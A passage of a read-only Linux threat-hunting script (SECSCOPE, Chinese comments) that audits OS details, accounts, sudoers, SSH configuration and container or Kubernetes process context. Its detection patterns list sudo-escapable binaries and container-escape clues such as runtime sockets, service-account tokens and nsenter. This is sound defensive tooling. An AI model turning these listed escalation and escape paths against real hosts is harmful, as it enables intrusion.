    [ -s "${pdir}/exe_link" ] || rm -f "${pdir}/exe_link"
    [ -s "${pdir}/cwd_link" ] || rm -f "${pdir}/cwd_link"
    [ -s "${pdir}/cgroup" ] || rm -f "${pdir}/cgroup"
    [ -s "${pdir}/mountinfo" ] || rm -f "${pdir}/mountinfo"
    [ -s "${pdir}/fd_list" ] || rm -f "${pdir}/fd_list"
    [ -s "${pdir}/namespaces" ] || rm -f "${pdir}/namespaces"
    [ -s "${pdir}/stdio_network" ] || rm -f "${pdir}/stdio_network"
    [ -s "${pdir}/maps_head100" ] || rm -f "${pdir}/maps_head100"
    find "$pdir" -type f -exec chmod 600 {} + 2>/dev/null || true
    # 如果目录非空, 返回0
    [ -n "$(ls -A "$pdir" 2>/dev/null)" ]
}

#==============================================================================
# OS 检测
#==============================================================================

detect_os() {
    if [ -f /etc/os-release ]; then
        # 不 source 该文件：它是主机上的可写文本，source 会把其中的命令以 root 执行。
        OS_ID="$(sed -n 's/^ID=//p' /etc/os-release | head -1 | sed 's/^"//;s/"$//')"
        OS_NAME="$(sed -n 's/^PRETTY_NAME=//p' /etc/os-release | head -1 | sed 's/^"//;s/"$//')"
        OS_VERSION="$(sed -n 's/^VERSION_ID=//p' /etc/os-release | head -1 | sed 's/^"//;s/"$//')"
        [ -n "$OS_ID" ] || OS_ID="unknown"
        [ -n "$OS_NAME" ] || OS_NAME="${OS_ID}"
        [ -n "$OS_VERSION" ] || OS_VERSION="unknown"
    elif [ -f /etc/redhat-release ]; then
        OS_ID="rhel"
        OS_NAME="$(cat /etc/redhat-release)"
        OS_VERSION="unknown"
    else
        OS_ID="unknown"
        OS_NAME="$(uname -s)"
        OS_VERSION="$(uname -r)"
    fi

    case "$OS_ID" in
        ubuntu|debian|kali)
            PKG_MGR="dpkg"
            AUTH_LOG="/var/log/auth.log"
            SYSLOG="/var/log/syslog"
            ;;
        centos|rhel|fedora|rocky|almalinux|ol|tencentos|anolis)
            PKG_MGR="rpm"
            AUTH_LOG="/var/log/secure"
            SYSLOG="/var/log/messages"
            ;;
        opensuse*|sles)
            PKG_MGR="rpm"
            AUTH_LOG="/var/log/messages"
            SYSLOG="/var/log/messages"
            ;;
        *)
            PKG_MGR="unknown"
            AUTH_LOG="/var/log/auth.log"
            SYSLOG="/var/log/syslog"
            ;;
    esac
}

#==============================================================================
# Banner
#==============================================================================

print_secscope_logo() {
    local cols
    cols=$(tput cols 2>/dev/null || printf '%s' "${COLUMNS:-80}")
    [[ "$cols" =~ ^[0-9]+$ ]] || cols=80
    if [ "$cols" -lt 62 ]; then
        printf '%bSECSCOPE%b v%s\n' "$BOLD$CYAN" "$NC" "$DISPLAY_VERSION"
        printf '%b  Host inspection / threat hunting%b\n' "$DIM" "$NC"
        printf '  %s | YARA:%s\n' "$SCAN_PROFILE" "${YARA_MODE:-auto}"
        printf '  READ-ONLY / OFFLINE\n\n'
    else
        printf '%b%s%b\n' "$BOLD$CYAN" '     _____ _____ _____   _____ _____ _____ _____ _____' "$NC"
        printf '%b%s%b\n' "$BOLD$CYAN" '    |   __|   __|     | |   __|     |     |  _  |   __|' "$NC"
        printf '%b%s%b\n' "$BOLD$CYAN" '    |__   |   __|   --| |__   |   --|  |  |   __|   __|' "$NC"
        printf '%b%s%b\n' "$BOLD$CYAN" '    |_____|_____|_____| |_____|_____|_____|__|  |_____|' "$NC"
        printf '%b%s%b\n' "$DIM" '                                          v1.1.0' "$NC"
        printf '    PROFILE:%s  YARA:%s  READ-ONLY / OFFLINE\n\n' \
            "$SCAN_PROFILE" "${YARA_MODE:-auto}"
    fi
}

print_banner() {
    KERNEL_VER="$(uname -r)"
    ARCH="$(uname -m)"
    UPTIME_STR="$(uptime 2>/dev/null | sed 's/^ *//')"
    ONLINE_USERS="$(who -q 2>/dev/null | head -1)"
    HOST_IP="$(hostname -I 2>/dev/null | awk '{print $1}')"
    LOADAVG="$(cat /proc/loadavg 2>/dev/null)"
    print_secscope_logo
    # 交互面板使用紧凑运行视图；详细主机信息仍写入报告和 runtime.log。
    if panel_supported; then
        return 0
    fi

    printf '%b  TARGET%b    %s\n' "$BOLD$CYAN" "$NC" "$(term_safe "$HOSTNAME")"
    printf '%b  SYSTEM%b    %s / %s\n' "$BOLD$CYAN" "$NC" "$(term_safe "$OS_NAME")" "$(term_safe "$ARCH")"
    printf '%b  KERNEL%b    %s\n' "$BOLD$CYAN" "$NC" "$(term_safe "$KERNEL_VER")"
    printf '%b  UPTIME%b    %s\n' "$BOLD$CYAN" "$NC" "$(term_safe "$UPTIME_STR")"
    printf '%b  USERS%b     %s\n' "$BOLD$CYAN" "$NC" "$(term_safe "$ONLINE_USERS")"
    printf '%b  LOAD%b      %s\n' "$BOLD$CYAN" "$NC" "$(term_safe "$LOADAVG")"
    printf '%b  PACKAGES%b  %s\n' "$BOLD$CYAN" "$NC" "$(term_safe "$PKG_MGR")"
    printf '%b  STARTED%b   %s UTC\n' "$BOLD$CYAN" "$NC" "$TIMESTAMP"
    printf '%b  OUTPUT%b    %s\n\n' "$BOLD$CYAN" "$NC" "$(term_safe "$OUTPUT_DIR")"

    # 运行时间检查 — 小于 2 小时可能是重启清理痕迹
    local uptime_sec=$(awk '{print int($1)}' /proc/uptime 2>/dev/null)
    if [ -n "$uptime_sec" ] && [ "$uptime_sec" -lt 7200 ]; then
        printf '%b  [!] 系统运行时间不到 2 小时，可能存在重启后痕迹缺失%b\n\n' "$YELLOW" "$NC"
    fi
}

#==============================================================================
# 01 — 系统基础信息
#==============================================================================

check_system_info() {
    echo ""
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}${MAGENTA}  [01/12] 系统基础信息${NC}"
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

    collect_local_addresses
    collect_endpoint_security
    collect_component_inventory
    collect_patch_posture
    local local_ip_text="未获取"
    [ "${#LOCAL_ADDRESSES[@]}" -eq 0 ] || local_ip_text="${LOCAL_ADDRESSES[*]}"
    echo -e "  ${DIM}IP 地址:${NC}    ${local_ip_text}"
    echo -e "  ${DIM}路由表:${NC}"
    ip route show 2>/dev/null | head -10 | while read line; do echo "    $line"; done

    echo -e "  ${DIM}DNS 配置:${NC}"
    safe_cat /etc/resolv.conf | grep -v '^#' | grep -v '^$' | head -10 | while read line; do echo "    $line"; done

    # DNS 篡改检测
    if grep -qE '8\.8\.8\.8|1\.1\.1\.1|208\.67\.222\.222' /etc/resolv.conf 2>/dev/null; then
        : # 正常公共 DNS
    elif grep -qE 'nameserver' /etc/resolv.conf 2>/dev/null; then
        local dns_ip=$(grep '^nameserver' /etc/resolv.conf | awk '{print $2}' | grep -v '^127\.' | grep -v '^::1' | head -3)
        # 不自动判定异常，只记录
    fi

    echo -e "  ${DIM}磁盘使用:${NC}"
    df -h 2>/dev/null | grep -v '^tmpfs\|^devtmpfs\|^overlay\|^snap' | head -20 | while read line; do echo "    $line"; done

    echo -e "  ${DIM}内存:${NC}"
    free -h 2>/dev/null | head -3 | while read line; do echo "    $line"; done

    echo -e "  ${DIM}内核参数(网络转发):${NC}"
    sysctl net.ipv4.ip_forward 2>/dev/null

    local uptime_sec
    uptime_sec=$(awk '{print int($1)}' /proc/uptime 2>/dev/null)
    if [[ "$uptime_sec" =~ ^[0-9]+$ ]] && [ "$uptime_sec" -lt 7200 ]; then
        add_priority_recommendation recent-reboot '近期重启' "运行时间 $((uptime_sec / 60)) 分钟" '结合变更窗口、登录和日志完整性确认重启原因；该项不单独计为威胁'
    fi

    # ---- 原始数据 ----
    {
        echo "hostname: ${HOSTNAME}"
        echo "os: ${OS_NAME}"
        echo "kernel: $(uname -r)"
        echo "arch: $(uname -m)"
        echo "uptime: $(uptime)"
        echo "loadavg: $(cat /proc/loadavg 2>/dev/null)"
        echo "ip: ${local_ip_text}"
        echo "--- df -h ---"; df -h
        echo "--- free -h ---"; free -h
        echo "--- /proc/cpuinfo (model) ---"; grep -m1 'model name' /proc/cpuinfo 2>/dev/null || grep -m1 'Model' /proc/cpuinfo 2>/dev/null
        echo "--- ip route ---"; ip route show 2>/dev/null
        echo "--- resolv.conf ---"; grep -v '^#' /etc/resolv.conf 2>/dev/null | grep -v '^$'
    } | dump_raw "system_info.txt"

    log_info "系统信息采集完成"
}

#==============================================================================
# 02 — 用户与认证
#==============================================================================

check_users_auth() {
    echo ""
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BOLD}${MAGENTA}  [02/12] 用户与认证${NC}"
    echo -e "${BOLD}${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"

    # UID=0 的账户
    local uid0=$(awk -F: '$3==0 {print $1}' /etc/passwd 2>/dev/null | grep -v '^root$')
    if [ -n "$uid0" ]; then
        for u in $uid0; do
            emit_find "CRITICAL" "UID=0 后门账户: $u" \
                "UID=0 的非 root 账户 $u 存在于 /etc/passwd" \
                "检查该账户是否为已知业务账户，否则立即禁用: usermod -L $u"
            record_find "CRITICAL" "users" "UID=0 后门账户: $u" "UID=0 的非 root 账户" "检查并禁用" "T1078.001"
            add_ioc "User" "$u" "UID=0 非 root 账户"
        done
    else
        log_info "UID=0 账户检查通过（仅 root）"
    fi

    # 空口令
    # shadow 第二字段为空才代表真正的空口令；! 和 * 是锁定状态。
    local empty_pw2=$(awk -F: '{if($2=="")print $1}' /etc/shadow 2>/dev/null)
    if [ -n "$empty_pw2" ]; then
        for u in $empty_pw2; do
            emit_find "CRITICAL" "空口令账户: $u" \
                "$u 在 /etc/shadow 中口令字段为空" \
                "立即设置密码: passwd $u"
            record_find "CRITICAL" "baseline" "空口令账户: $u" "shadow 口令字段为空" "设置密码" "T1078.001"
        done
    else
        log_info "空口令检查通过"
    fi

    # 可登录用户
    echo -e "\n  ${BOLD}可登录用户:${NC}"
    local login_users=$(grep -v '/nologin\|/false\|/sync\|/halt\|/shutdown' /etc/passwd 2>/dev/null | awk -F: '{print $1 " (UID=" $3 ")"}')
    echo "$login_users" | head -30 | while read line; do echo "    $line"; done

    local login_count=$(echo "$login_users" | grep -c . 2>/dev/null || true)
    if [ "$login_count" -gt 10 ]; then
        emit_find "MEDIUM" "可登录用户较多 (${login_count}个)" \
            "超过 10 个可登录 shell 用户，可能存在未使用的账户" \
            "审查不需要登录的用户，改为 /sbin/nologin"
        record_find "MEDIUM" "baseline" "可登录用户较多" "数量: ${login_count}" "审查并禁用不必要的登录用户" "T1078"
    fi

    # NOPASSWD sudo — 区分受限命令(监控agent) vs 不受限 ALL
    # grep -r 输出为 "文件:内容"，需过滤注释行(文件:开头带#)和空行
    local nopasswd=$(grep -rE 'NOPASSWD' /etc/sudoers /etc/sudoers.d/ 2>/dev/null | grep -vE ':[[:space:]]*#' | grep -v '^$')
    if [ -n "$nopasswd" ]; then
        echo -e "\n  ${YELLOW}NOPASSWD sudo 用户:${NC}"
        echo "$nopasswd" | while read line; do echo "    $line"; done
        # systemctl/mount/解释器/编辑器等即使只允许单个命令，也可能获得完整 root shell。
        local dangerous=$(echo "$nopasswd" | grep -vE ':[[:space:]]*#' | grep -Ei \
            'NOPASSWD:[[:space:]]*(ALL|.*(/|^)(systemctl|mount|umount|journalctl|bash|sh|dash|zsh|python[0-9.]*|perl|ruby|lua|vim|vi|less|more|find|awk|tar|cp|tee|env)([[:space:],]|$))' | head -5)
        local clearly_limited=$(echo "$nopasswd" | grep -vE ':[[:space:]]*#' | grep -E \
            'NOPASSWD:[[:space:]]*/(usr/)?bin/(df|ping)([[:space:],]|$)' | head -5)
        if [ -n "$dangerous" ]; then
            emit_find "HIGH" "发现可直接或间接提权的 NOPASSWD sudo" \
                "$(echo "$dangerous" | head -2 | tr '\n' ' ')" \
                "将权限限制为不可逃逸的具体命令和固定参数，并检查目标脚本是否可写"
            record_find "HIGH" "baseline" "高风险 NOPASSWD" "$dangerous" "限制命令、参数及目标文件写权限" "T1548.003" \
                "BAS-SUDO-NOPASSWD-HIGH" "high-risk-nopasswd" "sudoers_all.txt,module-users.log"
        elif [ -n "$clearly_limited" ] && [ "$(echo "$nopasswd" | grep -c .)" -eq "$(echo "$clearly_limited" | grep -c .)" ]; then
            emit_find "LOW" "发现低风险的受限 NOPASSWD sudo" \
                "$(echo "$clearly_limited" | head -2 | tr '\n' ' ')" \
                "确认命令参数和 sudoers 规则仍符合最小权限原则"
            record_find "LOW" "baseline" "受限 NOPASSWD" "$clearly_limited" "确认命令和参数范围" "" \
                "BAS-SUDO-NOPASSWD-LIMITED" "limited-nopasswd" "sudoers_all.txt,module-users.log"
        else
            emit_find "MEDIUM" "发现 NOPASSWD sudo 权限" \
                "$(echo "$nopasswd" | head -2 | tr '\n' ' ')" \
                "审查这些权限是否必要"
            record_find "MEDIUM" "baseline" "NOPASSWD sudo" "$nopasswd" "审查必要性" "" \
                "BAS-SUDO-NOPASSWD" "nopasswd" "sudoers_all.txt,module-users.log"
        fi
    fi

    # authorized_keys 检查
    echo -e "\n  ${BOLD}SSH Authorized Keys:${NC}"
    local key_count=0
    local suspicious_keys=()
    for home_dir in /home/* /root; do
        local ak="${home_dir}/.ssh/authorized_keys"
        if [ -f "$ak" ]; then
            local keys_in_file=$(grep -c 'ssh-' "$ak" 2>/dev/null)
            [ -z "$keys_in_file" ] && keys_in_file=0
            key_count=$((key_count + keys_in_file))
            local user=$(basename "$home_dir")
            echo "    ${user}: ${keys_in_file} 个公钥 — $ak"
            # 检查异常注释的公钥 (排除已知运维平台/云厂商公钥)
            local weird=$(grep -E 'admin@|root@|test@|backdoor' "$ak" 2>/dev/null \
                | grep -viE 'alibaba|aliyun|tencent|cloudadmin|ops@|deploy@|jenkins|gitlab|ansible|puppet|salt|monitor|nagios')
            if [ -n "$weird" ]; then
                suspicious_keys+=("${user}: ${weird}")
            fi
        fi
    done
    if [ "${#suspicious_keys[@]}" -gt 0 ]; then
        emit_find "MEDIUM" "SSH 公钥注释命中需核验的关键词" \
            "${suspicious_keys[*]}" \
            "注释名称不是入侵证据；请与公钥指纹、账号归属和基线比对"
        record_find "MEDIUM" "users" "SSH 公钥注释异常" "${suspicious_keys[*]}" "核对公钥指纹和账号归属" "T1098.004" \
            "USR-SSH-KEY-COMMENT" "ssh-key-comment" "authorized_keys.txt" "SECURITY_ANOMALY" "LOW" \
            '仅公钥注释命中 admin/root/test/backdoor，可能是正常命名，不能据此判定未授权密钥' \
            '若公钥为基线新增、文件由异常进程修改或对应账号出现陌生登录，应升级处置'
    fi

    # 当前登录用户
    echo -e "\n  ${BOLD}当前登录:${NC}"
    local who_snapshot
    who_snapshot=$(who -uH 2>/dev/null || who 2>/dev/null)
    printf '%s\n' "$who_snapshot" | head -20 | while read line; do echo "    $line"; done
    local logged_in=$(printf '%s\n' "$who_snapshot" | awk '$1!="NAME" {print $1}' | sort -u)
    for user in $logged_in; do
        local user_sessions tty_count remote_count session_sev="OBSERVE"
        user_sessions=$(printf '%s\n' "$who_snapshot" | awk -v u="$user" '$1==u')
        tty_count=$(printf '%s\n' "$user_sessions" | grep -c . 2>/dev/null || true)
        remote_count=$(printf '%s\n' "$user_sessions" | awk '{src=$NF; if (src ~ /^\(.+\)$/) seen[src]=1} END {for (s in seen) n++; print n+0}')
        if [ "$tty_count" -gt 5 ]; then
            [ "$remote_count" -ge 3 ] && session_sev="MEDIUM"
            emit_find "$session_sev" "用户 $user 有 ${tty_count} 个活跃会话" \
                "独立远端来源=${remote_count}; $(printf '%s' "$user_sessions" | head -6 | tr '\n' ';')" \
                "核实来源、TTY、空闲时间和会话内进程；会话数量本身不证明入侵"
            record_find "$session_sev" "users" "多会话用户: $user" \
                "会话数=${tty_count}; 独立远端来源=${remote_count}; 会话=$(printf '%s' "$user_sessions" | head -10 | tr '\n' ';')" \
                "核实来源、TTY、空闲时间和会话内进程" "" "USR-MULTI-SESSION" "$user" \
                "who_sessions.txt,last_logins.txt" "SECURITY_ANOMALY" "LOW" \
                '多个终端会话常见于正常 SSH、SFTP 和运维操作，单独不作为安全威胁' \
                '若同时出现多个陌生来源、异常子进程、提权、下载执行或持久化，应升级处置'
        fi
    done
    printf '%s\n' "$who_snapshot" | dump_raw "who_sessions.txt"

    # 最近登录
    echo -e "\n  ${BOLD}最近登录:${NC}"
    last -n 20 2>/dev/null | while read line; do echo "    $line"; done

    # SSH 配置检查
    echo -e "\n  ${BOLD}SSH 配置关键项:${NC}"
    safe_read /etc/ssh/sshd_config | grep -E '^(PermitRootLogin|PasswordAuthentication|Port|AuthorizedKeysFile|AllowUsers|AllowGroups|PubkeyAuthentication|PermitEmptyPasswords|X11Forwarding)' 2>/dev/null | while read line; do echo "    $line"; done

    local sshd_effective=""
    command -v sshd >/dev/null 2>&1 && sshd_effective=$(sshd -T 2>/dev/null)
    local permit_root=$(printf '%s\n' "$sshd_effective" | awk '$1=="permitrootlogin" {print $2; exit}')
    [ -n "$permit_root" ] || permit_root=$(grep -Ei '^[[:space:]]*PermitRootLogin[[:space:]]+' /etc/ssh/sshd_config 2>/dev/null | tail -1 | awk '{print tolower($2)}')
    if [ "$permit_root" = "yes" ]; then
        emit_find "HIGH" "SSH 允许 root 直接登录" \
            "有效配置 PermitRootLogin = ${permit_root}" \
            "设置 PermitRootLogin no，使用普通用户+sudo"
        record_find "HIGH" "baseline" "SSH 允许 root 登录" "PermitRootLogin=${permit_root}" "改为 no" "T1021.004" \
            "BAS-SSH-ROOT-LOGIN" "permit-root-login" "sshd_config.txt,module-users.log"
    fi

    local pass_auth=$(printf '%s\n' "$sshd_effective" | awk '$1=="passwordauthentication" {print $2; exit}')
    [ -n "$pass_auth" ] || pass_auth=$(grep -Ei '^[[:space:]]*PasswordAuthentication[[:space:]]+' /etc/ssh/sshd_config 2>/dev/null | tail -1 | awk '{print tolower($2)}')
    if [ "$pass_auth" = "yes" ]; then
        emit_find "MEDIUM" "SSH 允许密码登录" \
            "PasswordAuthentication = yes" \
            "建议改为密钥登录，禁用密码认证"
        record_find "MEDIUM" "baseline" "SSH 密码可登录" "PasswordAuthentication=yes" "改用密钥登录" "" \
            "BAS-SSH-PASSWORD-AUTH" "password-authentication" "sshd_config.txt,module-users.log"
    fi

    # ---- 原始数据 ----
    dump_raw "passwd.txt" cat /etc/passwd
    dump_raw "sudoers_all.txt" bash -c 'cat /etc/sudoers 2>/dev/null; for f in /etc/sudoers.d/*; do [ -f "$f" ] && echo "--- $f ---" && cat "$f"; done'
    dump_raw "sshd_config.txt" cat /etc/ssh/sshd_config
    dump_raw "authorized_keys.txt" bash -c 'for h in /root /home/*; do ak="${h}/.ssh/authorized_keys"; [ -f "$ak" ] || continue; echo "=== $ak ==="; cat "$ak"; done; exit 0'

    log_info "用户与认证检查完成"
}

#==============================================================================
# 进程上下文与强混淆/无文件行为
#==============================================================================

process_ancestry_five() {
    local pid="$1" depth=0 current="$1" out="" ppid comm exe
    while [ "$depth" -lt 5 ] && [[ "$current" =~ ^[0-9]+$ ]] && [ "$current" -gt 1 ]; do
        ppid=$(awk '/^PPid:/ {print $2; exit}' "/proc/${current}/status" 2>/dev/null)
        [ -n "$ppid" ] || break
        comm=$(cat "/proc/${ppid}/comm" 2>/dev/null || echo unknown)
        exe=$(readlink "/proc/${ppid}/exe" 2>/dev/null || echo unknown)
        out="${out}${out:+ <- }${ppid}:${comm}:${exe}"
        current="$ppid"; depth=$((depth + 1))
    done
    printf '%s' "$out"
}

trusted_change_context_for_pid() {
    local pid="$1" depth=0 current="$1" comm args
    while [ "$depth" -lt 6 ] && [[ "$current" =~ ^[0-9]+$ ]] && [ "$current" -gt 1 ]; do
        comm=$(cat "/proc/${current}/comm" 2>/dev/null || true)
        args=$(tr '\0' ' ' < "/proc/${current}/cmdline" 2>/dev/null | head -c 500)
        case "$comm $args" in
            *apt*|*apt-get*|*dpkg*|*yum*|*dnf*|*rpm*|*unattended-upgrade*|*ansible*|*salt-minion*|*salt-call*|*jenkins*|*gitlab-runner*)
                printf '%s:%s' "$current" "$comm"; return 0 ;;
        esac
        current=$(awk '/^PPid:/ {print $2; exit}' "/proc/${current}/status" 2>/dev/null)
        depth=$((depth + 1))
    done
    return 1
}

process_package_and_integrity() {
    local exe="$1" owner="" package="" verify="UNKNOWN" cached=false verify_output="" encoded=""
    [ -n "$exe" ] && [ -f "$exe" ] || { printf 'unowned|missing'; return; }
    case "$PKG_MGR" in
        dpkg)
            owner=$(file_package_owner "$exe")
            if [ -n "$owner" ] && [ "$PROFILE_PACKAGE_INTEGRITY" = true ]; then
                package="${owner%%:*}"
            fi
            ;;
        rpm)
            owner=$(rpm -qf -- "$exe" 2>/dev/null | head -1)
            if [ -n "$owner" ] && [ "$PROFILE_PACKAGE_INTEGRITY" = true ]; then
                package="$owner"
            fi
            ;;
    esac
    if [ -n "$package" ]; then
        if [ -z "$PACKAGE_VERIFY_CACHE_FILE" ]; then
            PACKAGE_VERIFY_CACHE_FILE="${OUTPUT_DIR:-${TMPDIR:-/tmp}}/.package-verify-cache.${RUN_ID}"
        fi
        if [ -r "$PACKAGE_VERIFY_CACHE_FILE" ]; then
            awk -F '\t' -v manager="$PKG_MGR" -v package="$package" \
                '$1==manager && $2==package {found=1; exit} END {exit !found}' \
                "$PACKAGE_VERIFY_CACHE_FILE" 2>/dev/null && cached=true
        fi
        if [ "$cached" = true ]; then
            encoded=$(awk -F '\t' -v manager="$PKG_MGR" -v package="$package" \
                '$1==manager && $2==package {print $3; exit}' "$PACKAGE_VERIFY_CACHE_FILE" 2>/dev/null)
            [ -z "$encoded" ] || verify_output=$(printf '%s' "$encoded" | base64 -d 2>/dev/null || true)
            verify=$(printf '%s\n' "$verify_output" | grep -Fq -- "$exe" && printf MISMATCH || printf NO_MISMATCH_REPORTED)
        else
            case "$PKG_MGR" in
                dpkg) verify_output=$(dpkg -V "$package" 2>/dev/null || true) ;;
                rpm) verify_output=$(rpm -V "$package" 2>/dev/null || true) ;;
            esac
            verify=$(printf '%s\n' "$verify_output" | grep -Fq -- "$exe" && printf MISMATCH || printf NO_MISMATCH_REPORTED)
            # Command substitution runs this function in a subshell, so cache
            # the complete output. Encoding preserves paths and whitespace.
            encoded=$(printf '%s' "$verify_output" | base64 | tr -d '\n')
            printf '%s\t%s\t%s\n' "$PKG_MGR" "$package" "$encoded" >> "$PACKAGE_VERIFY_CACHE_FILE" 2>/dev/null || true
            chmod 600 "$PACKAGE_VERIFY_CACHE_FILE" 2>/dev/null || true
        fi
    fi
    printf '%s|%s' "${owner:-unowned}" "$verify"
}

container_runtime_from_cgroup() {
    local cgroup="$1"
    case "$cgroup" in
        *libpod*|*podman*) printf podman ;;
        *cri-o*|*crio*) printf cri-o ;;
        *containerd*|*cri-containerd*) printf containerd ;;
        *docker*) printf docker ;;
        *lxc*) printf lxc ;;
        *)
            if [ -e /.dockerenv ]; then printf docker
            elif [ -e /run/.containerenv ]; then printf container
            else printf none; fi
            ;;
    esac
}

container_id_from_cgroup() {
    local cgroup="$1" value
    value=$(printf '%s\n' "$cgroup" | grep -Eo '[0-9a-f]{64}' | head -1)
    if [ -z "$value" ]; then
        value=$(printf '%s\n' "$cgroup" | sed -nE 's#.*(docker-|cri-containerd-|crio-|libpod-)([0-9a-f]{12,64})([.]scope)?(/.*)?$#\2#p' | head -1)
    fi
    printf '%s' "$value"
}

pod_uid_from_cgroup() {
    local value
    value=$(printf '%s\n' "$1" | grep -Eo 'pod[0-9a-fA-F][0-9a-fA-F_-]{20,}' | head -1)
    value="${value#pod}"
    printf '%s' "$value" | tr '_' '-'
}

k8s_namespace_for_pid() {
    local pid="$1" value
    value=$(tr '\0' '\n' < "/proc/${pid}/environ" 2>/dev/null | sed -nE 's/^(POD_NAMESPACE|KUBERNETES_NAMESPACE)=//p' | head -1)
    [ -n "$value" ] || value=$(cat "/proc/${pid}/root/var/run/secrets/kubernetes.io/serviceaccount/namespace" 2>/dev/null | head -c 253)
    [ -n "$value" ] || value=$(tr '\0' ' ' < "/proc/${pid}/cmdline" 2>/dev/null | sed -nE 's/.*--namespace(=|[[:space:]]+)([^[:space:]]+).*/\2/p' | head -1)
    printf '%s' "$value" | tr '\t\r\n' '   '
}

host_namespace_overlap() {
    local pid="$1" runtime="$2" name current init overlaps=""
    [ "$runtime" != none ] || { printf no; return; }
    # Inside a container, /proc/1 is the container init rather than the host
    # init, so equality is not evidence of host namespace sharing.
    if [ -e /.dockerenv ] || [ -e /run/.containerenv ]; then printf unknown; return; fi
    for name in mnt pid net user; do
        current=$(readlink "/proc/${pid}/ns/${name}" 2>/dev/null)
        init=$(readlink "/proc/1/ns/${name}" 2>/dev/null)
        [ -n "$current" ] && [ "$current" = "$init" ] && overlaps="${overlaps}${overlaps:+,}${name}"
    done
    [ -n "$overlaps" ] && printf 'yes:%s' "$overlaps" || printf no
}

is_normal_kubernetes_component() {
    case "$1:$2" in
        kubelet:*|kube-proxy:*|kube-apiserver:*|kube-scheduler:*|kube-controller-manager:*|containerd-shim:*|pause:*|*/pause:*) return 0 ;;
    esac
    return 1
}

collect_kubernetes_context() {
    local out="${RAW_DIR}/kubernetes-context.tsv" pid_dir pid comm cmd cgroup runtime instance fds mounts cap host_overlap clues counter network persistence domains finding_type clue_count link target inode unix_path
    local applicable=false
    declare -A unix_socket_paths=()
    while IFS=$'\t' read -r inode unix_path; do [ -n "$inode$unix_path" ] && unix_socket_paths["$inode"]="$unix_path"; done < <(awk 'NR>1 && NF>=8 {print $7 "\t" $8}' /proc/net/unix 2>/dev/null)
    printf 'process_instance_id\tpid\tcomm\tcontainer_runtime\tevidence_types\tcommand_line\topen_file_or_mount_evidence\tnetwork_context\tcounter_evidence\tassessment\n' > "$out"
    [ "$CONTAINER_CONTEXT_COUNT" -gt 0 ] && applicable=true
    [ "$HOST_ROLE" = kubernetes ] && applicable=true
    [ -d /var/lib/kubelet ] || [ -d /etc/kubernetes ] && applicable=true
    ps -eo comm= 2>/dev/null | grep -qE '^(kubelet|kube-proxy|kube-apiserver|containerd-shim)$' && applicable=true
    if [ "$applicable" = false ]; then
        KUBERNETES_CONTEXT_STATUS=NOT_APPLICABLE
        record_raw_status 'kubernetes-context.tsv' NOT_APPLICABLE container 'no_container_or_kubernetes_context'
        return 0
    fi
    KUBERNETES_CONTEXT_COUNT=0; KUBERNETES_ANOMALY_COUNT=0
    for pid_dir in /proc/[0-9]*; do
        pid="${pid_dir#/proc/}"; [ -r "$pid_dir/status" ] || continue
        comm=$(cat "$pid_dir/comm" 2>/dev/null); cmd=$(tr '\0\t\n' '   ' < "$pid_dir/cmdline" 2>/dev/null | head -c 1000)
        cgroup=$(awk -F: '{printf "%s%s",sep,$3;sep=","}' "$pid_dir/cgroup" 2>/dev/null); runtime=$(container_runtime_from_cgroup "$cgroup")
        instance=$(awk -F '\t' -v p="$pid" 'NR>1 && $3==p {print $1;exit}' "${RAW_DIR}/process-context.tsv" 2>/dev/null)
        fds=$(for link in "$pid_dir"/fd/*; do
            target=$(readlink "$link" 2>/dev/null) || continue
            if [[ "$target" == socket:* ]]; then
                inode=$(printf '%s' "$target" | tr -cd '0-9')
                unix_path="${unix_socket_paths[$inode]:-}"
                [ -n "$unix_path" ] && printf '%s\n' "$unix_path" || printf '%s\n' "$target"
            else
                printf '%s\n' "$target"
            fi
        done | grep -E '/var/run/docker[.]sock|/run/containerd/containerd[.]sock|/var/run/crio/crio[.]sock|/var/run/secrets/kubernetes[.]io/serviceaccount/token|^/host(/|$)|^/proc/1/root(/|$)|^/var/lib/kubelet(/|$)|^/etc/kubernetes(/|$)' | head -20)
        mounts=$(grep -E ' /host(/|[[:space:]])| /proc/1/root(/|[[:space:]])| /var/lib/kubelet(/|[[:space:]])| /etc/kubernetes(/|[[:space:]])' "$pid_dir/mountinfo" 2>/dev/null | head -10)
        cap=$(awk '/^CapEff:/ {print $2;exit}' "$pid_dir/status" 2>/dev/null)
        host_overlap=$(awk -F '\t' -v p="$pid" 'NR>1 && $1==p {print $9;exit}' "${RAW_DIR}/container-context.tsv" 2>/dev/null)
        clues=""
        printf '%s\n%s' "$cmd" "$fds" | grep -qE '/var/run/docker[.]sock|/run/containerd/containerd[.]sock|/var/run/crio/crio[.]sock' && clues="runtime_socket"
        printf '%s\n%s' "$cmd" "$fds" | grep -qF '/var/run/secrets/kubernetes.io/serviceaccount/token' && clues="${clues}${clues:+,}serviceaccount_token"
        printf '%s\n%s\n%s' "$cmd" "$fds" "$mounts" | grep -qE '(^|[ =])/host(/|[[:space:]]|$)|/proc/1/root|/var/lib/kubelet|/etc/kubernetes' && clues="${clues}${clues:+,}host_path_access"
        printf '%s\n%s' "$cmd" "$mounts" | grep -qiE 'privileged|hostPID|hostNetwork|nsenter|setns|unshare' && clues="${clues}${clues:+,}privileged_or_host_namespace"
        [[ "$host_overlap" != yes:* ]] || clues="${clues}${clues:+,}host_namespace_overlap"
        [ "$cap" != 000001ffffffffff ] || clues="${clues}${clues:+,}full_capability_set"
        [ -n "$clues" ] || continue
        counter="none"
        if is_normal_kubernetes_component "$comm" "$cmd"; then counter="normal_kubernetes_component=${comm}"; fi
        network=$(socket_snapshot established | grep -E "pid=${pid}," | head -5)
        persistence=""; [ -s "$EVENT_CACHE_FILE" ] && persistence=$(grep -F "\"pid\":\"${pid}\"" "$EVENT_CACHE_FILE" 2>/dev/null | grep -E 'cron|systemd|authorized_keys|ld[.]so[.]preload' | head -3)
